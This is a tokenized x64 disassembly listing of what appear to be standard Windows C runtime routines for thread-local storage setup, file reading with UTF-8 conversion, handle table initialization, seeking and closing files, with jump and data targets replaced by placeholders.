mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0x80 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov rcx [ rbx + 0xa0 ]
lea rax [ r--data ]
cmp rcx rax
je r-xdata
call sub_14003ad04
mov edi 0xd
mov ecx edi
call sub_140046c48
nop
mov rcx [ rbx + 0xb8 ]
mov [ rsp + 0x30 ] rcx
test rcx rcx
je r-xdata
call sub_14003ad04
mov ecx edi
call sub_140046b48
mov ecx 0xc
call sub_140046c48
nop
mov rdi [ rbx + 0xc0 ]
test rdi rdi
je r-xdata
[ rcx ]
jne r-xdata
mov ecx 0xc
call sub_140046b48
mov rcx rbx
call sub_14003ad04
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
mov rcx rdi
call sub_140045cb4
cmp rdi [ rw-data ]
je r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
lea rax [ rw-data ]
cmp rdi rax
je r-xdata
call sub_14003ad04
nop
cmp [ rdi ] 0x0
jne r-xdata
mov rcx rdi
call sub_140045d58
nop
sub_140043d8c
push rbx
sub rsp 0x20
call sub_14003de98
call sub_140046a3c
test eax eax
je r-xdata
call sub_140043ad0
xor eax eax
lea rcx [ sub_140043c58 ]
call [ FlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
mov edx 0x2c8
mov ecx 0x1
call sub_140041704
mov rbx rax
test rax rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
test eax eax
je r-xdata
xor edx edx
mov rcx rbx
call sub_140043af8
call [ GetCurrentThreadId@IAT ]
or [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_140043e10
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x18 ]
test al 0x83
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ rcx + 0x18 ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ rcx + 0x18 ] eax
jmp r-xdata
mov rax [ rcx + 0x10 ]
mov [ rcx ] rax
call sub_1400500b0
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ rdi + 0x18 ] eax
and [ rdi + 0x8 ] 0x0
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_14003be60
mov r8d [ rdi + 0x24 ]
mov rdx [ rdi + 0x10 ]
mov ecx eax
call sub_140044688
mov [ rdi + 0x8 ] eax
test eax eax
je r-xdata
test [ rdi + 0x18 ] 0x82
jne r-xdata
cmp [ rdi + 0x24 ] 0x200
jne r-xdata
mov rcx rdi
call sub_14003be60
cmp eax 0xffffffff
je r-xdata
mov rcx [ rdi ]
dec [ rdi + 0x8 ]
movzx eax [ rcx ]
inc rcx
mov [ rdi ] rcx
jmp r-xdata
test [ rdi + 0x18 ] 0x8
je r-xdata
lea r11 [ rw-data ]
mov rcx rdi
call sub_14003be60
cmp eax 0xfffffffe
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov eax [ rdi + 0x24 ]
test [ rdi + 0x18 ] 0x400
mov ecx 0x1000
cmove eax ecx
mov [ rdi + 0x24 ] eax
bts [ rdi + 0x18 ] 0xd
mov rcx rdi
call sub_14003be60
mov rcx rdi
lea rsi [ rw-data ]
movsxd rbx eax
sar rbx 0x5
call sub_14003be60
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ rsi + rbx * 8 ]
jmp r-xdata
mov al [ r11 + 0x8 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_140043f64
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] ecx
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x58
movsxd rax ecx
mov ebx r8d
mov [ rbp - 0x20 ] 0xfffffffe
mov [ rbp - 0x1c ] ebx
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
test ecx ecx
js r-xdata
call sub_14003f1c4
xor edi edi
mov [ rax ] edi
call sub_14003f1a4
mov [ rax ] 0x9
jmp r-xdata
call sub_14003f1c4
mov [ rax ] edi
call sub_14003f1a4
mov [ rax ] 0x9
cmp eax [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rsi rax
mov r15 rax
lea r9 [ __dos_header ]
sar r15 0x5
and esi 0x1f
mov rcx [ r9 + r15 * 8 + 0x96dc0 ]
imul rsi rsi 0x58
mov al [ rcx + rsi + 0x8 ]
test al 0x1
je r-xdata
cmp ebx 0x7fffffff
jbe r-xdata
mov r12d edi
test ebx ebx
je r-xdata
call sub_14003f1c4
mov [ rax ] edi
call sub_14003f1a4
mov [ rax ] 0x16
jmp r-xdata
xor eax eax
jmp r-xdata
test al 0x2
jne r-xdata
call sub_140043760
add rsp 0x58
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
test rdx rdx
je r-xdata
mov r13b [ rcx + rsi + 0x38 ]
mov r8d 0x4
add r13b r13b
sar r13b 0x1
movsx ecx r13b
mov [ rbp + 0x60 ] r13b
dec ecx
je r-xdata
mov eax ebx
not eax
test al 0x1
je r-xdata
dec ecx
jne r-xdata
shr ebx 0x1
cmp ebx r8d
cmovb ebx r8d
mov ecx ebx
call sub_140041684
mov r14 rax
test rax rax
jne r-xdata
mov r14 rdx
jmp r-xdata
mov eax ebx
not eax
test al 0x1
je r-xdata
mov ecx [ rbp + 0x48 ]
xor edx edx
lea r8d [ rdx + 0x1 ]
call sub_140050450
lea r9 [ __dos_header ]
mov r11 rax
mov rax [ r9 + r15 * 8 + 0x96dc0 ]
mov [ rax + rsi + 0x40 ] r11
call sub_14003f1a4
mov [ rax ] 0xc
call sub_14003f1c4
mov [ rax ] 0x8
jmp r-xdata
mov rax [ r9 + r15 * 8 + 0x96dc0 ]
mov rdx r14
mov r8d 0xa
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
and ebx 0xfffffffe
mov rcx [ r9 + r15 * 8 + 0x96dc0 ]
lea r9 [ rbp - 0x24 ]
mov r8d ebx
mov rcx [ rcx + rsi ]
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ rax + rsi + 0x9 ]
cmp cl r8b
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x5
jne r-xdata
movsxd rdx [ rbp - 0x24 ]
test edx edx
js r-xdata
test ebx ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
call sub_14003f1c4
mov [ rax ] 0x5
jmp r-xdata
mov eax ebx
cmp rdx rax
ja r-xdata
mov [ r14 ] cl
mov rax [ r9 + r15 * 8 + 0x96dc0 ]
or r10d 0xffffffff
add ebx r10d
lea rdx [ r14 + 0x1 ]
lea r12d [ r8 - 0x9 ]
mov [ rax + rsi + 0x9 ] r8b
test r13b r13b
je r-xdata
mov ecx eax
call sub_14003f1e4
jmp r-xdata
mov ebx edi
jmp r-xdata
or ebx 0xffffffff
jmp r-xdata
lea r8 [ __dos_header ]
add r12d edx
mov rax [ r8 + r15 * 8 + 0x96dc0 ]
test [ rax + rsi + 0x8 ] 0x80
je r-xdata
mov rax [ r9 + r15 * 8 + 0x96dc0 ]
mov cl [ rax + rsi + 0x39 ]
cmp cl r8b
je r-xdata
mov r13 [ rbp + 0x50 ]
mov ebx [ rbp - 0x20 ]
cmp r13b 0x2
je r-xdata
test ebx ebx
je r-xdata
cmp ebx 0xfffffffe
cmove ebx r12d
mov eax ebx
jmp r-xdata
mov rcx r14
call sub_14003ad04
test edx edx
mov edx 0xa
je r-xdata
test edx edx
je r-xdata
mov [ rdx ] cl
mov rax [ r9 + r15 * 8 + 0x96dc0 ]
add ebx r10d
inc rdx
lea r12d [ r8 - 0x8 ]
mov [ rax + rsi + 0x39 ] r8b
cmp r13b 0x1
jne r-xdata
and [ rax + rsi + 0x8 ] 0xfb
cmp [ r14 ] dx
jne r-xdata
and [ rax + rsi + 0x8 ] 0xfb
cmp [ r14 ] 0xa
jne r-xdata
mov rax [ r9 + r15 * 8 + 0x96dc0 ]
mov cl [ rax + rsi + 0x3a ]
cmp cl r8b
je r-xdata
mov r12d ebx
sub r12d r14d
mov r12d 0xd
or [ rax + rsi + 0x8 ] 0x4
jmp r-xdata
mov r12d ebx
sub r12d r14d
cmp [ rbp + 0x60 ] 0x1
jne r-xdata
mov r12d 0xd
or [ rax + rsi + 0x8 ] 0x4
jmp r-xdata
test ebx ebx
je r-xdata
mov rax [ r8 + r15 * 8 + 0x96dc0 ]
test [ rax + rsi + 0x8 ] 0x40
jne r-xdata
cmp ax r12w
je r-xdata
movsxd rax r12d
mov rbx r14
mov r13 r14
add rax r14
mov [ rbp + 0x60 ] rax
cmp r14 rax
jae r-xdata
test r12d r12d
je r-xdata
mov rax [ r8 + r15 * 8 + 0x96dc0 ]
test [ rax + rsi + 0x8 ] 0x40
jne r-xdata
cmp al r12b
je r-xdata
movsxd rax r12d
mov rbx r14
mov r13 r14
add rax r14
mov [ rbp - 0x18 ] rax
cmp r14 rax
jae r-xdata
mov [ rdx ] cl
mov rax [ r9 + r15 * 8 + 0x96dc0 ]
inc rdx
lea r12d [ r8 - 0x7 ]
add ebx r10d
mov [ rax + rsi + 0x3a ] r8b
movzx eax [ r13 ]
mov [ rbx ] ax
add rbx 0x2
or [ rax + rsi + 0x8 ] 0x2
jmp r-xdata
mov rax [ rbp + 0x60 ]
add rax 0xfffffffffffffffe
cmp r13 rax
jae r-xdata
mov [ rbx ] ax
add rbx 0x2
add r13 0x2
jmp r-xdata
dec rbx
test [ rbx ] 0x80
jne r-xdata
mov al [ r13 ]
mov [ rbx ] al
inc rbx
or [ rax + rsi + 0x8 ] 0x2
jmp r-xdata
mov rax [ rbp - 0x18 ]
dec rax
cmp r13 rax
jae r-xdata
mov [ rbx ] al
inc rbx
inc r13
jmp r-xdata
mov rcx [ r8 + r15 * 8 + 0x96dc0 ]
lea r9 [ rbp - 0x24 ]
lea rdx [ rbp - 0x28 ]
mov rcx [ rcx + rsi ]
mov r8d 0x2
add r13 0x2
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea rax [ r13 + 0x2 ]
cmp [ rax ] dx
jne r-xdata
cmp r13 [ rbp + 0x60 ]
jb r-xdata
mov edx 0x1
jmp r-xdata
inc rbx
jmp r-xdata
mov rcx [ r8 + r15 * 8 + 0x96dc0 ]
lea r9 [ rbp - 0x24 ]
lea rdx [ rbp + 0x58 ]
mov rcx [ rcx + rsi ]
mov r8d 0x1
inc r13
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea rax [ r13 + 0x1 ]
cmp [ rax ] 0xa
jne r-xdata
cmp r13 [ rbp - 0x18 ]
jb r-xdata
cmp [ rbp - 0x24 ] edi
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov r13 rax
jmp r-xdata
add r13 0x4
jmp r-xdata
movzx eax [ r13 ]
cmp ax 0x1a
je r-xdata
jmp r-xdata
movzx eax [ rbx ]
cmp [ rax + r8 + 0x91b00 ] dil
je r-xdata
mov eax [ rbp - 0x1c ]
mov r13 [ rbp + 0x50 ]
sub ebx r14d
shr eax 0x1
mov r9d ebx
mov r8 r14
mov [ rsp + 0x28 ] eax
xor edx edx
mov ecx 0xfde9
mov [ rsp + 0x20 ] r13
call [ MultiByteToWideChar@IAT ]
mov r12d eax
test eax eax
jne r-xdata
cmp [ rbp - 0x24 ] edi
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov r13 rax
jmp r-xdata
add r13 0x2
jmp r-xdata
mov al [ r13 ]
cmp al 0x1a
je r-xdata
jmp r-xdata
mov edx 0xa
lea r8 [ __dos_header ]
lea r8 [ __dos_header ]
mov rax [ r8 + r15 * 8 + 0x96dc0 ]
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
mov [ rbx ] r12w
mov [ rbx ] dx
jmp r-xdata
cmp edx 0x4
jg r-xdata
movzx ecx [ rbx ]
movsx eax [ rcx + r8 + 0x91b00 ]
test eax eax
jne r-xdata
cmp eax ebx
mov ebx [ rbp - 0x20 ]
lea rax [ __dos_header ]
mov rax [ rax + r15 * 8 + 0x96dc0 ]
setne dil
add r12d r12d
mov [ rax + rsi + 0x48 ] edi
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx eax
call sub_14003f1e4
or ebx 0xffffffff
jmp r-xdata
lea r8 [ __dos_header ]
lea r8 [ __dos_header ]
mov rax [ r8 + r15 * 8 + 0x96dc0 ]
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
mov [ rbx ] r12b
mov [ rbx ] 0xa
jmp r-xdata
cmp rbx r14
jne r-xdata
mov edx 0xa
cmp [ rbp - 0x28 ] dx
je r-xdata
add rbx 0x2
cmp rbx r14
jb r-xdata
inc eax
cmp eax edx
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x2a
cmp r14 r13
je r-xdata
cmp rbx r14
jne r-xdata
cmp [ rbp + 0x58 ] 0xa
je r-xdata
inc rbx
mov ecx [ rbp + 0x48 ]
mov rdx 0xfffffffffffffffe
lea r8d [ rdx + 0x3 ]
call sub_140050450
mov edx 0xa
lea r8 [ __dos_header ]
cmp [ rbp - 0x28 ] dx
je r-xdata
mov edx 0xa
cmp [ rbp - 0x28 ] dx
jne r-xdata
mov [ rbx ] r12w
mov al [ rbp - 0x28 ]
mov rcx [ r8 + r15 * 8 + 0x96dc0 ]
mov [ rcx + rsi + 0x9 ] al
mov al [ rbp - 0x27 ]
mov rcx [ r8 + r15 * 8 + 0x96dc0 ]
mov [ rcx + rsi + 0x39 ] al
mov rax [ r8 + r15 * 8 + 0x96dc0 ]
mov [ rax + rsi + 0x3a ] dl
jmp r-xdata
dec rbx
inc edx
mov rax [ r8 + r15 * 8 + 0x96dc0 ]
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
movsxd rax edx
add rbx rax
jmp r-xdata
mov ecx [ rbp + 0x48 ]
mov r8d 0x1
or rdx 0xffffffffffffffff
call sub_140050450
cmp [ rbp + 0x58 ] 0xa
lea r8 [ __dos_header ]
je r-xdata
cmp [ rbp + 0x58 ] 0xa
jne r-xdata
mov [ rbx ] r12b
mov rcx [ r8 + r15 * 8 + 0x96dc0 ]
mov al [ rbp + 0x58 ]
mov [ rcx + rsi + 0x9 ] al
jmp r-xdata
jmp r-xdata
mov ecx [ rbp + 0x48 ]
neg edx
mov r8d 0x1
movsxd rdx edx
call sub_140050450
inc rbx
mov [ rax + rsi + 0x9 ] cl
cmp edx 0x2
jl r-xdata
jmp r-xdata
cmp edx 0x3
jne r-xdata
mov al [ rbx ]
mov rcx [ r8 + r15 * 8 + 0x96dc0 ]
inc rbx
mov [ rcx + rsi + 0x39 ] al
movsxd rax edx
sub rbx rax
jmp r-xdata
mov al [ rbx ]
mov rcx [ r8 + r15 * 8 + 0x96dc0 ]
inc rbx
mov [ rcx + rsi + 0x3a ] al
sub_140044688
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov esi r8d
mov r13 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
xor ebx ebx
test ecx ecx
js r-xdata
call sub_14003f1c4
xor ebx ebx
mov [ rax ] ebx
call sub_14003f1a4
mov [ rax ] 0x9
jmp r-xdata
call sub_14003f1c4
mov [ rax ] ebx
call sub_14003f1a4
mov [ rax ] 0x9
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov r12 rdi
mov r14 rdi
sar r14 0x5
lea r15 [ rw-data ]
and r12d 0x1f
imul r12 r12 0x58
mov rax [ r15 + r14 * 8 ]
movsx ecx [ rax + r12 + 0x8 ]
and ecx 0x1
je r-xdata
mov eax ebx
cmp r8d 0x7fffffff
setbe al
test eax eax
jne r-xdata
mov ecx edi
call sub_140046e5c
nop
mov rax [ r15 + r14 * 8 ]
test [ rax + r12 + 0x8 ] 0x1
je r-xdata
call sub_14003f1c4
mov [ rax ] ebx
call sub_14003f1a4
mov [ rax ] 0x16
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
call sub_14003f1c4
mov [ rax ] ebx
or ebx 0xffffffff
mov r8d esi
mov rdx r13
mov ecx edi
call sub_140043f64
mov ebx eax
jmp r-xdata
call sub_140043760
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov ecx edi
call sub_140046f04
mov eax ebx
jmp r-xdata
sub_1400447a4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x90
lea rcx [ rsp + 0x20 ]
call [ GetStartupInfoW@IAT ]
mov edx 0x58
lea ebp [ rdx - 0x38 ]
mov ecx ebp
call sub_140041704
xor r14d r14d
mov rdx rax
test rax rax
jne r-xdata
mov [ rw-data ] rax
add rax 0xb00
mov ecx ebp
mov [ rw-data ] ecx
cmp rdx rax
jae r-xdata
or eax 0xffffffff
jmp r-xdata
cmp [ rsp + 0x62 ] r14w
je r-xdata
add rdx 0x9
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
mov r12d r14d
mov rbx r14
mov rax [ rsp + 0x68 ]
test rax rax
je r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x2f ] 0xa00
mov [ rdx + 0x31 ] 0xa
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rw-data ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov ecx [ rw-data ]
lea eax [ r12 - 0x1 ]
mov [ rbx + rdi + 0x8 ] 0x81
neg eax
mov eax 0xfffffff6
sbb ecx ecx
add ecx 0xfffffff5
test r12d r12d
cmove ecx eax
call [ GetStdHandle@IAT ]
mov rbp rax
cmp rax 0xffffffffffffffff
je r-xdata
cmp [ rbx + rdi ] 0xfffffffffffffffe
je r-xdata
movsxd r12 [ rax ]
mov ebx 0x800
lea r13 [ rax + 0x4 ]
add r12 r13
cmp [ rax ] ebx
cmovl ebx [ rax ]
cmp ecx ebx
jge r-xdata
or [ rbx + rdi + 0x8 ] 0x40
mov [ rbx + rdi ] 0xfffffffffffffffe
test rax rax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x80
jmp r-xdata
mov edi r14d
test ebx ebx
jle r-xdata
lea rdi [ rw-data ]
mov rdi [ rw-data ]
cmp [ rbx + rdi ] 0xffffffffffffffff
je r-xdata
mov ecx [ rw-data ]
call [ SetHandleCount@IAT ]
xor eax eax
mov rcx rax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
add rbx 0x58
inc r12d
cmp rbx 0x108
jl r-xdata
cmp [ r12 ] 0xffffffffffffffff
je r-xdata
mov ebx [ rw-data ]
mov edx [ rw-data ]
lea rcx [ rax + 0xb00 ]
mov [ rdi ] rax
add edx ebp
mov [ rw-data ] edx
cmp rax rcx
jae r-xdata
movzx eax al
mov [ rbx + rdi ] rbp
cmp eax 0x2
jne r-xdata
inc edi
inc r13
add r12 0x8
cmp edi ebx
jl r-xdata
cmp [ r12 ] 0xfffffffffffffffe
je r-xdata
add rdi 0x8
cmp edx ebx
jl r-xdata
lea rdx [ rax + 0x9 ]
cmp eax 0x3
jne r-xdata
or [ rbx + rdi + 0x8 ] 0x40
jmp r-xdata
test [ r13 ] 0x1
je r-xdata
mov edx 0x58
mov rcx rbp
call sub_140041704
test rax rax
je r-xdata
jmp r-xdata
or [ rdx - 0x9 ] 0xffffffffffffffff
and [ rdx + 0x2f ] 0x80
mov [ rdx - 0x1 ] 0xa00
mov [ rdx + 0x3 ] r14d
mov [ rdx + 0x30 ] 0xa0a
mov [ rdx + 0x47 ] r14d
mov [ rdx + 0x43 ] r14b
mov rax [ rdi ]
add rdx 0x58
lea rcx [ rdx - 0x9 ]
add rax 0xb00
cmp rcx rax
jb r-xdata
mov edx [ rw-data ]
lea rcx [ rbx + rdi + 0x10 ]
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
or [ rbx + rdi + 0x8 ] 0x8
test [ r13 ] 0x8
jne r-xdata
inc [ rbx + rdi + 0xc ]
jmp r-xdata
movsxd rbp edi
lea rcx [ rw-data ]
mov edx 0xfa0
mov rax rbp
and ebp 0x1f
sar rax 0x5
imul rbp rbp 0x58
add rbp [ rcx + rax * 8 ]
mov rax [ r12 ]
mov [ rbp ] rax
mov al [ r13 ]
lea rcx [ rbp + 0x10 ]
mov [ rbp + 0x8 ] al
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
mov rcx [ r12 ]
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc [ rbp + 0xc ]
sub_140044a78
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
movsxd rbx ecx
mov edi r8d
mov esi edx
mov ecx ebx
call sub_140046de8
cmp rax 0xffffffffffffffff
jne r-xdata
mov r9d edi
xor r8d r8d
mov edx esi
mov rcx rax
call [ SetFilePointer@IAT ]
mov edi eax
cmp eax 0xffffffff
jne r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
mov rax rbx
lea rdx [ rw-data ]
sar rax 0x5
and ecx 0x1f
mov rax [ rdx + rax * 8 ]
imul rcx rcx 0x58
and [ rax + rcx + 0x8 ] 0xfd
mov eax edi
mov ecx eax
call sub_14003f1e4
jmp r-xdata
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
sub_140044b10
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12d edx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_14003f1c4
and [ rax ] 0x0
call sub_14003f1a4
mov [ rax ] 0x9
jmp r-xdata
call sub_14003f1c4
and [ rax ] 0x0
call sub_14003f1a4
mov [ rax ] 0x9
call sub_140043760
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_140046e5c
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
call sub_14003f1c4
and [ rax ] 0x0
or ebx 0xffffffff
mov r8d esi
mov edx r12d
mov ecx edi
call sub_140044a78
mov ebx eax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_140046f04
mov eax ebx
jmp r-xdata
sub_140044bf0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rdi ecx
mov ecx edi
call sub_140046de8
cmp rax 0xffffffffffffffff
je r-xdata
xor ebx ebx
mov rax [ rw-data ]
mov ecx 0x2
cmp edi 0x1
jne r-xdata
xor eax eax
mov ecx ebx
call sub_14003f1e4
or eax 0xffffffff
jmp r-xdata
cmp edi ecx
jne r-xdata
test [ rax + 0xb8 ] dil
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx edi
call sub_140046de8
mov rcx rax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ rax + 0x60 ] 0x1
je r-xdata
call sub_140046de8
mov ecx 0x1
mov rbx rax
call sub_140046de8
cmp rax rbx
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_140046d3c
mov r11 rdi
mov rcx rdi
sar rcx 0x5
and r11d 0x1f
lea rdx [ rw-data ]
mov rcx [ rdx + rcx * 8 ]
imul r11 r11 0x58
mov [ rcx + r11 + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_140044cac
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x20
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_14003f1c4
and [ rax ] 0x0
call sub_14003f1a4
mov [ rax ] 0x9
jmp r-xdata
call sub_14003f1c4
and [ rax ] 0x0
call sub_14003f1a4
mov [ rax ] 0x9
call sub_140043760
cmp ebx [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rdi rbx
mov rsi rbx
sar rsi 0x5
lea r12 [ rw-data ]
and edi 0x1f
imul rdi rdi 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rdi + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx ebx
call sub_140046e5c
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rdi + 0x8 ] 0x1
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
or edi 0xffffffff
mov ecx ebx
call sub_140044bf0
mov edi eax
jmp r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov ecx ebx
call sub_140046f04
mov eax edi
jmp r-xdata
sub_140044d70
push rbx
sub rsp 0x20
test [ rcx + 0x18 ] 0x83
mov rbx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
test [ rcx + 0x18 ] 0x8
je r-xdata
mov rcx [ rcx + 0x10 ]
call sub_14003ad04
and [ rbx + 0x18 ] 0xfffffbf7
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x8 ] eax
sub_140044da8
mov rax rsp
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov [ rax + 0x8 ] ecx
push rdi
sub rsp 0x20
mov rcx rdx
mov rbx rdx
call sub_14003be60
mov ecx [ rbx + 0x18 ]
movsxd rsi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
xor edi edi
test cl 0x1
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x22
jmp r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov eax [ rbx + 0x18 ]
mov [ rbx + 0x8 ] edi
and eax 0xffffffef
or eax 0x2
mov [ rbx + 0x18 ] eax
test eax 0x10c
jne r-xdata
mov [ rbx + 0x8 ] edi
test cl 0x10
je r-xdata
or [ rbx + 0x18 ] 0x20
test [ rbx + 0x18 ] 0x108
je r-xdata
call sub_14003bc4c
add rax 0x30
cmp rbx rax
je r-xdata
or ecx 0x20
mov [ rbx + 0x18 ] ecx
jmp r-xdata
mov rax [ rbx + 0x10 ]
and ecx 0xfffffffe
mov [ rbx ] rax
mov [ rbx + 0x18 ] ecx
mov ebp 0x1
lea rdx [ rsp + 0x30 ]
mov ecx esi
mov r8d ebp
call sub_14004f254
mov edi eax
mov ebp [ rbx ]
mov rdx [ rbx + 0x10 ]
sub ebp [ rbx + 0x10 ]
lea rax [ rdx + 0x1 ]
mov [ rbx ] rax
mov eax [ rbx + 0x24 ]
dec eax
mov [ rbx + 0x8 ] eax
test ebp ebp
jle r-xdata
mov ecx esi
call sub_1400514c8
test eax eax
jne r-xdata
call sub_14003bc4c
add rax 0x60
cmp rbx rax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
movzx eax [ rsp + 0x30 ]
cmp esi 0xffffffff
je r-xdata
mov r8d ebp
mov ecx esi
call sub_14004f254
mov edi eax
jmp r-xdata
mov rcx rbx
call sub_1400500b0
lea rcx [ rw-data ]
cmp esi 0xfffffffe
je r-xdata
mov rcx [ rbx + 0x10 ]
mov al [ rsp + 0x30 ]
mov [ rcx ] al
jmp r-xdata
xor edx edx
mov ecx esi
lea r8d [ rdx + 0x2 ]
call sub_1400504e8
cmp rax 0xffffffffffffffff
je r-xdata
mov rcx rsi
mov rax rsi
lea rdx [ rw-data ]
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
add rcx [ rdx + rax * 8 ]
jmp r-xdata
cmp edi ebp
jne r-xdata
test [ rcx + 0x8 ] 0x20
je r-xdata
sub_140044f38
test edx edx
jle r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebx edx
mov bpl cl
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
